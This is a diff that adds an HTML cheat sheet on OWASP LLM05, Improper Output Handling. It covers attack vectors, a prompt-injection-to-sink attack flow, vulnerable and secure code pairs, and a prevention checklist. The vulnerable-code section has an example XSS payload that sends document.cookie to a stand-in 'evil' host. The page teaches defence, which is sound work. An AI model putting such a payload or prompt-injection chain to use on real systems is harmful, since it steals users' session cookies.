@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LLM05: Improper Output Handling - Quick Reference</title>
+    <link rel="stylesheet" href="../../assets/cheat-sheet-style.css">
+    <style>
+        .back-nav { position: fixed; top: 20px; left: 20px; z-index: 1000; }
+        .back-btn {
+            display: inline-flex; align-items: center; gap: 8px;
+            padding: 10px 20px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--darker-color); text-decoration: none; border-radius: 6px;
+            font-weight: 600; border: 1px solid var(--primary-color);
+            box-shadow: none; transition: all 0.3s;
+        }
+        .back-btn:hover { transform: translateX(-5px); box-shadow: none; }
+        .year-badge {
+            background: rgba(245, 158, 11, 0.2); color: var(--primary-color);
+            padding: 4px 12px; border-radius: 4px; font-size: 0.9rem;
+            font-weight: 700; margin-left: 10px;
+        }
+        @media print { .back-nav { display: none; } }
+    </style>
+</head>
+<body>
+    <div class="back-nav">
+        <a href="../../index.html" class="back-btn">
+            <i class="fas fa-arrow-left"></i> Back to Cheat Sheets
+        </a>
+    </div>
+
+    <div class="cheat-sheet">
+        <div class="header">
+            <h1>🖨️ Improper Output Handling<span class="year-badge">LLM05</span></h1>
+            <p class="subtitle">OWASP LLM Top 10 2025 · LLM05</p>
+            <span class="category">CRITICAL RISK</span>
+        </div>
+
+        <div class="content">
+            <div class="section full-width">
+                <h2>📋 What Is It?</h2>
+                <p><strong>Improper Output Handling</strong> is the insufficient validation, sanitization, and encoding of the text a model produces <em>before</em> it reaches another component. The bug is not in the model — it is in the code that consumes the output and treats it as trusted. The mental model: <strong>treat every token an LLM emits as untrusted user input.</strong> If that output flows into a browser, shell, SQL query, HTTP client, file path, or <code>eval()</code>, the attacker has reached across the model into your downstream system. (Renamed from 2023's <em>LLM02: Insecure Output Handling</em>.)</p>
+                <div class="stats-grid">
+                    <div class="stat-box"><span class="value">LLM05</span><span class="label">OWASP Rank 2025</span></div>
+                    <div class="stat-box"><span class="value">XSS → RCE</span><span class="label">Impact Range</span></div>
+                    <div class="stat-box"><span class="value">LLM01 → LLM05</span><span class="label">Common Chain</span></div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>⚠️ Top Attack Vectors</h2>
+                <ul>
+                    <li><strong>Reflected / stored XSS:</strong> output placed in the DOM via <code>innerHTML</code></li>
+                    <li><strong>Markdown image/link exfiltration:</strong> auto-loaded URL leaks data (zero-click)</li>
+                    <li><strong>SQL / NoSQL injection:</strong> output concatenated into a query</li>
+                    <li><strong>OS command injection:</strong> output passed through a shell</li>
+                    <li><strong>Code execution via eval/exec:</strong> output run as code (highest severity)</li>
+                    <li><strong>SSRF:</strong> server fetches a model-supplied URL (cloud metadata, internal)</li>
+                    <li><strong>Path traversal &amp; SSTI:</strong> output builds a file path or template source</li>
+                    <li><strong>Agent tool abuse:</strong> free-form output selects tool + arguments</li>
+                </ul>
+            </div>
+
+            <div class="section">
+                <h2>🎯 Every Bug Has 3 Conditions</h2>
+                <div class="tip-box">
+                    <p><strong>1. INFLUENCE</strong> — attacker shapes the output (direct or indirect injection).</p>
+                    <p><strong>2. FLOW</strong> — output reaches a sink without context-appropriate encoding/parameterization.</p>
+                    <p><strong>3. SINK</strong> — the sink interprets structure: browser parses HTML/JS, DB parses SQL, shell parses metacharacters, <code>eval()</code> parses code.</p>
+                    <p>You can't remove (1) — models are influenceable by design — so defenders concentrate on the handoff (2) and constrain the sink (3).</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🔴 Attack Flow</h2>
+                <div class="attack-flow">
+1. INDUCE: attacker influences the prompt (direct or via a doc/page/email)<br>
+   <span class="arrow">↓</span><br>
+2. EMIT: model produces output containing a payload (script, SQL, URL, code)<br>
+   <span class="arrow">↓</span><br>
+3. EXECUTE: a vulnerable sink interprets the payload<br>
+   <span class="arrow">↓</span><br>
+4. IMPACT: XSS, data exfiltration, SSRF, or remote code execution<br>
+                </div>
+            </div>
+
+            <div class="section full-width">
+                <h2>❌ Vulnerable Code</h2>
+                <div class="code-block vulnerable">
+<span class="comment">// Front end: model answer injected as HTML — classic XSS sink</span>
+<span class="keyword">const</span> answer = <span class="keyword">await</span> getModelAnswer(question);
+document.getElementById(<span class="string">"reply"</span>).innerHTML = answer;   <span class="comment">// parses HTML</span>
+<span class="comment">// Exploit: model returns &lt;img src=x onerror="fetch('//evil/c?'+document.cookie)"&gt;</span>
+
+<span class="comment"># Python: model output concatenated into SQL and passed to a shell</span>
+product = llm(f<span class="string">"Extract the product name from: {user_text}"</span>)
+cur.execute(f<span class="string">"SELECT * FROM products WHERE name = '{product}'"</span>)  <span class="comment"># SQLi</span>
+
+name = llm(f<span class="string">"Suggest a filename for: {desc}"</span>)
+os.system(f<span class="string">"convert input.png /out/{name}.png"</span>)   <span class="comment"># shell parses ; | $() `</span>
+
+expr = llm(f<span class="string">"Write a Python expression for: {q}"</span>)
+answer = eval(expr)   <span class="comment"># arbitrary code execution</span>
+                </div>
+            </div>
+
+            <div class="section full-width">
+                <h2>✅ Secure Code</h2>
+                <div class="code-block secure">
+<span class="comment">// textContent never parses HTML: the payload is shown as literal text</span>
+document.getElementById(<span class="string">"reply"</span>).textContent = answer;
+<span class="comment">// For Markdown: DOMPurify allow-list, drop &lt;img&gt;, and a strict CSP backstop</span>
+
+<span class="comment"># SQL: parameterized — the value can never alter query structure</span>
+q = <span class="string">"SELECT id, name, price FROM products WHERE name = ?"</span>
+conn.execute(q, (product,)).fetchall()
+
+<span class="comment"># Shell: argument array, no shell -> metacharacters are inert</span>
+<span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">r"[a-zA-Z0-9_-]{1,40}"</span>, name <span class="keyword">or</span> <span class="string">""</span>):
+    name = f<span class="string">"thumb-{uuid.uuid4().hex}"</span>
+subprocess.run([<span class="string">"convert"</span>, <span class="string">"input.png"</span>, f<span class="string">"/out/{name}.png"</span>],
+               shell=<span class="keyword">False</span>, check=<span class="keyword">True</span>, timeout=<span class="number">10</span>)
+
+<span class="comment"># Never eval model output — parse a constrained grammar / safe evaluator</span>
+<span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">r"[0-9+\-*/().\s]{1,100}"</span>, expr):
+    <span class="keyword">raise</span> ValueError(<span class="string">"unsupported expression"</span>)
+result = safe_math_eval(expr)   <span class="comment"># no host access, no import</span>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>✓ Prevention Checklist</h2>
+                <ul class="checklist">
+                    <li>Treat model output as untrusted input everywhere it crosses a boundary</li>
+                    <li>Context-encode for the exact sink (HTML body/attr, JS, URL, CSS, SQL, shell)</li>
+                    <li>Parameterize all DB calls; bind output as values only</li>
+                    <li>Never pass output to <code>eval</code>/<code>exec</code>/<code>os.system</code>/deserializers; sandbox any code</li>
+                    <li>Sanitize Markdown/HTML with a strict allow-list; serve a restrictive CSP</li>
+                    <li>Allow-list model-supplied URLs (scheme + host) before any fetch (SSRF)</li>
+                    <li>Canonicalize file paths with a base-directory containment check</li>
+                    <li>Schema-validate + allow-list agent tool arguments; least-privilege creds</li>
+                    <li>Human approval for high-impact actions; log output that triggers side effects</li>
+                </ul>
+            </div>
+
+            <div class="section">
+                <h2>🧰 Tools &amp; Takeaway</h2>
+                <div class="tools-list">
+                    <span class="tool-tag">DOMPurify</span>
+                    <span class="tool-tag">bleach</span>
+                    <span class="tool-tag">Content-Security-Policy</span>
+                    <span class="tool-tag">Pydantic (tool schemas)</span>
+                    <span class="tool-tag">Parameterized queries</span>
+                    <span class="tool-tag">SAST taint tracking</span>
+                </div>
+                <div class="warning-box">
+                    <p><strong>"It came from our own AI" is provenance, not integrity.</strong> Guardrails target harmful <em>meaning</em>; a benign-looking sentence can still carry <code>&lt;/script&gt;</code>, a SQL quote, or a shell metacharacter. Deterministic encoding/parameterization at the sink is what actually stops the exploit — mark the model client as an appsec source and your XSS/SQLi/SSRF tooling lights up.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p><strong>OWASP LLM Top 10 2025 · Educational Repository</strong></p>
+            <p>Deep lesson: <code>labs/llm/OWASP-LLM/LLM05-Improper-Output-Handling/</code></p>
+            <p>📥 To download as PDF: Print this page (Ctrl+P) → Save as PDF</p>
+        </div>
+    </div>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</body>
+</html>
